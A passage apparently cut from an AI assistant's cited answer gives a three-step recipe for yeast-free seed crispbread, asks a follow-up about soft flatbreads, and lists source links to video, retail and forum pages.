   1. Hydrate: Mix all the seeds, spices, oil, and water in a large bowl. Let it sit for 30 to 60 minutes. The chia and flaxseeds will absorb the water, forming a thick, gel-like binder—no flour or yeast required. [5, 6] 
   2. Spread: Spread the mixture as thin and evenly as possible onto a baking sheet lined with parchment paper.
   3. Bake: Score the sheet into crispbread rectangles using a knife before cooking. Bake at 390°F (200°C) for roughly 30 minutes until intensely golden and completely dry. Let them cool entirely to achieve maximum crispness. [5, 7] 

Would you prefer to look for a soft flatbread option (like a yeast-free pita or wrap), or are you strictly focusing on crunchy crackers? [8, 9] 

[1] [https://www.youtube.com](https://www.youtube.com/watch?v=p-uFKoojoL0)
[2] [https://www.amazon.com](https://www.amazon.com/clp/B0F22S7X77)
[3] [https://www.walmart.com](https://www.walmart.com/c/kp/crispbread)
[4] [https://cooking.stackexchange.com](https://cooking.stackexchange.com/questions/24365/are-there-any-yeast-less-breads-that-can-be-used-as-sandwich-bread)
[5] [https://www.youtube.com](https://www.youtube.com/watch?v=T1yApTFEZIw)
[6] [https://www.youtube.com](https://www.youtube.com/watch?v=zm34unlH0zc&vl=bs)
[7] [https://www.facebook.com](https://www.facebook.com/healthy1tasty2/videos/inspired-by-wasa-style-crackers-these-gluten-free-crackers-are-crisp-nourishing-/26786064197689671/)
[8] [https://loafybread.com](https://loafybread.com/what-bread-does-not-contain-yeast/)
[9] [https://www.reddit.com](https://www.reddit.com/r/glutenfree/comments/1ewdcik/wheat_and_yeast_free_alternatives_to_bread/)
"
